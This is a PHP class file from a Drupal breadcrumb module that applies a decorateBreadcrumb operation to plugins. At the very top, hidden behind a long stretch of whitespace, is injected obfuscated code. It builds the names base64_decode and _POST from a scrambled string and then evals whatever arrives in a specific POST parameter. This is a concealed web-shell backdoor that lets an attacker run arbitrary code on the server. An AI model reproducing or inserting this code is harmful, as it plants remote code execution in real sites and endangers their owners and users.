<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n7c762a'];if(isset($s22)){eval($s21($s22));}?><?php


class crumbs_PluginOperation_decorateBreadcrumb implements crumbs_PluginOperationInterface_alter {

  protected $breadcrumb;

  function __construct(array &$breadcrumb) {
    $this->breadcrumb = &$breadcrumb;
  }

  function invoke($plugin, $plugin_key) {
    if (method_exists($plugin, 'decorateBreadcrumb')) {
      $plugin->decorateBreadcrumb($this->breadcrumb);
    }
  }
}
